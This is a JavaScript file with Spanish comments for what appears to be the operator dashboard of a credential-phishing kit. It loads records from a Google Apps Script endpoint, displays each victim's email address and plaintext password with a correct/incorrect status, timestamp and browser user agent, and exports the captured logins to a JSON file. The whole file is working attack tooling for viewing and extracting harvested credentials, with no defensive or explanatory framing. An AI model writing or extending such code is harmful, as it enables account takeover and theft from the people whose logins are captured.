// Configuración - MISMA URL
const API_URL = 'https://script.google.com/macros/s/AKfycbwsPj9OX59TC_rzS34hWt2N2cVrBSHJ7cl02cJ0fg1H0yVzxp5JcmL8rYmfmMMQpdISPw/exec';

document.addEventListener('DOMContentLoaded', function() {
    const dataContent = document.getElementById('dataContent');
    const refreshBtn = document.getElementById('refreshData');
    const clearBtn = document.getElementById('clearData');
    const exportBtn = document.getElementById('exportData');
    const totalAttempts = document.getElementById('totalAttempts');
    const successAttempts = document.getElementById('successAttempts');
    const failedAttempts = document.getElementById('failedAttempts');

    // Cargar datos al iniciar
    loadData();

    // Botón actualizar
    refreshBtn.addEventListener('click', loadData);

    // Botón limpiar
    clearBtn.addEventListener('click', function() {
        if (confirm('¿Estás seguro de que quieres limpiar la vista local?')) {
            dataContent.innerHTML = '<p class="no-data">No hay datos guardados aún</p>';
            updateStats([]);
        }
    });

    // Botón exportar
    exportBtn.addEventListener('click', exportData);

    async function loadData() {
        try {
            console.log('🔄 Cargando datos desde Google Sheets...');
            const response = await fetch(API_URL);
            const result = await response.json();
            
            console.log('📊 Datos recibidos:', result);
            
            if (result.success) {
                updateStats(result.data);
                updateDataContent(result.data);
            } else {
                alert('Error cargando datos: ' + result.error);
            }
        } catch (error) {
            console.error('❌ Error cargando datos:', error);
            alert('Error de conexión: ' + error.message);
        }
    }

    function updateStats(attempts) {
        totalAttempts.textContent = attempts.length;
        
        const success = attempts.filter(attempt => attempt.Status && attempt.Status.includes('CORRECTO')).length;
        const failed = attempts.filter(attempt => attempt.Status && attempt.Status.includes('INCORRECTO')).length;
        
        successAttempts.textContent = success;
        failedAttempts.textContent = failed;
    }

    function updateDataContent(loginAttempts) {
        if (loginAttempts.length === 0) {
            dataContent.innerHTML = '<p class="no-data">No hay datos guardados aún</p>';
            return;
        }

        let html = '';
        loginAttempts.forEach((attempt, index) => {
            const statusClass = attempt.Status && attempt.Status.includes('CORRECTO') ? 'status-correct' : 'status-incorrect';
            html += `
                <div class="user-data">
                    <div class="user-header">
                        <span class="user-email">📧 ${attempt.Email || 'N/A'}</span>
                        <span class="status ${statusClass}">${attempt.Status || '❌ INCORRECTO'}</span>
                    </div>
                    <div class="user-password">🔑 ${attempt.Password || 'N/A'}</div>
                    <div class="user-meta">
                        ⏰ ${attempt.Timestamp || 'N/A'} 
                        ${attempt.UserAgent ? `<br>🖥️ ${attempt.UserAgent.substring(0, 50)}...` : ''}
                    </div>
                </div>
            `;
        });

        dataContent.innerHTML = html;
    }

    function exportData() {
        const dataToExport = {
            exportDate: new Date().toISOString(),
            data: Array.from(document.querySelectorAll('.user-data')).map(item => ({
                email: item.querySelector('.user-email').textContent.replace('📧 ', ''),
                password: item.querySelector('.user-password').textContent.replace('🔑 ', ''),
                status: item.querySelector('.status').textContent,
                timestamp: item.querySelector('.user-meta').textContent.split('⏰ ')[1]?.split(' ')[0]
            }))
        };

        const blob = new Blob([JSON.stringify(dataToExport, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `datos-login-${new Date().toISOString().split('T')[0]}.json`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }
});
